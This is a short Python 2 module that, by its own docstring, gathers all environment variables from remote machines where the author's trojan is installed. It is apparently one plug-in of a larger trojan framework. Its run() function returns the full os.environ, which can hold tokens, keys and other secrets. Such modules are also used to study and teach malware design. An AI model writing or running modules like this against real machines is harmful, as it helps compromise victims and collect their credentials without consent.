# -*- coding: utf-8 -*-
'''
Gets all environment variables for remote machines where ur Trojan is located.
'''
import os


def run(**args):
    '''Receive the args to complete different tasks.'''
    print "[*] In environment module."
    return str(os.environ)
